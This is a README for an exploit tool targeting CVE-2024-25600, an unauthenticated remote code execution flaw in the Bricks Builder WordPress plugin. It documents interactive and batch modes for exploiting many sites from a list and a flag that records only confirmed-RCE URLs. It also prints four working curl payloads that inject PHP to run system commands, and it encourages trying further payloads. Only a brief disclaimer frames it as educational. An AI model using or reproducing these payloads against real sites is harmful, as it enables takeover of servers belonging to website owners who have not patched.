# CVE-2024-25600 Exploit Tool 🚀

## Description 📝

This tool 🛠️ is designed to exploit the CVE-2024-25600 vulnerability 🕳️ found in the Bricks Builder plugin for WordPress. The vulnerability allows for unauthenticated remote code execution on affected websites 💻. The tool automates the exploitation process by retrieving nonces and sending specially crafted requests to execute arbitrary commands.

## Features 🌟

- **Interactive Mode**: Engage with the target website in real-time 🕹️.
- **Batch Mode**: Scan and exploit multiple websites from a list 📋.
- **Command Execution**: Execute arbitrary commands on the target server ⚙️.
- **Payload Customization**: Choose between different payloads for exploitation, including `generic`, `carousel`, `container`, and `code` 🧰.
- **RCE Confirmation**: Option to display and record only URLs where RCE is confirmed ✔️.

## Installation 🛠️

1. Clone this repository to your local machine 🖥️ using `git clone`.
2. Navigate to the directory of the cloned repository.
3. Install the required Python libraries using `pip install -r requirements.txt`.

## Usage 📖

### Interactive Mode 🎮

1. Run the tool with `python exploit.py -u <URL>` to start interactive mode.
2. Follow the on-screen prompts to send commands to the target server.

### Batch Mode 📊

1. Prepare a text file with a list of target URLs.
2. Run the tool with `python exploit.py -l <file_path>` to scan and exploit the listed sites.
3. Use the `--only-rce` flag to display and record only URLs where RCE is confirmed.

### Payload Customization 🧰

- Use the `--payload-type` option followed by `generic`, `carousel`, `container`, or `code` to specify the type of payload for the exploit.
  
  Example: `python exploit.py -u <URL> --payload-type generic`

## Proof of Concept (PoC) 📝

The base PoCs provided by the disclosure are as follows:

**First PoC**:
```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

**Second PoC**:
```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "carousel",
    "settings": {
      "type": "posts",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

**Third PoC** [Source](https://www.linkedin.com/feed/update/urn:li:activity:7166462514099130368):
```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",  
  "nonce": "[NONCE]",
  "element": "1",
  "loopElement": {
    "settings": {
      "query": {
        "useQueryEditor": "",
        "queryEditor": "throw new Exception(`id`);"
      }
    }
  }
}'
```

**Fourth PoC** (Effective on Older Versions):
```bash
curl -k -X POST "http://[HOST]/index.php?rest_route=/bricks/v1/render_element" \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "code",
    "settings": {
      "executeCode": "true",
      "code": "<?php throw new Exception(`id`);?>"
    }
  }
}'
```
> Note: The fourth PoC is particularly effective on older versions of Bricks Builder (tested on version 1.8), where previous PoCs may not work.

> It's possible that additional payloads could yield better results. If my exploit or proof of concept does not work for you, I encourage you to experiment with alternative payloads to find a more effective solution.


Replace `[HOST]` with the target website and `[NONCE]` with the nonce value retrieved from the site.

## Reference 📖

For more information about the CVE-2024-25600 vulnerability, please refer to the detailed disclosure at [Snicco.io](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6).

## Disclaimer ⚠️

The information provided in this README is for educational purposes only. Unauthorized hacking into websites or networks is illegal and unethical. 🚫

## Acknowledgements 🙏

Kudos to the security researchers who discovered and reported this vulnerability, providing the community with information and tools to help secure their web applications.
